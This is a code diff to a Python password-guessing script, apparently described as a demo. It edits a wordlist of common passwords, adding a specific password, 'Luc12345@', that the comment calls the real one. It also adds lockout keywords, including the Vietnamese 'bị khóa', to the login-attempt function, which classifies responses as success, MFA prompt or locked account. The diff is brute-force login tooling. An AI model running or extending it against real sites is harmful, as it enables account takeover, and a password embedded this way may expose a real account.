@@ -44,7 +44,7 @@ QUICK_WORDLIST = [
     "superman", "michael", "football", "baseball", "iloveyou",
     "trustno1", "123abc", "hello123", "pass123", "test",
     # Add the real password last for demo purposes
-    "SecurePass123!", "demo123", "research2024",
+    "SecurePass123!", "demo123", "Luc12345@",
 ]
 
 
@@ -95,10 +95,10 @@ def attempt_login(session: requests.Session, username: str, password: str) -> di
         text = response.text.lower()
         url  = response.url
 
-        # Detect outcomes by redirect target or page content
+        # ── ĐÃ CẬP NHẬT: Thêm từ khóa "suspended" và "bị khóa" để nhận diện AI ──
         mfa_required = "verify_otp" in url or "two-factor" in text or "otp" in url
-        locked        = "account locked" in text or "locked" in text
-        success       = "dashboard" in url and not mfa_required
+        locked       = "account locked" in text or "locked" in text or "suspended" in text or "bị khóa" in text
+        success      = "dashboard" in url and not mfa_required
 
         return {
             "success":      success,
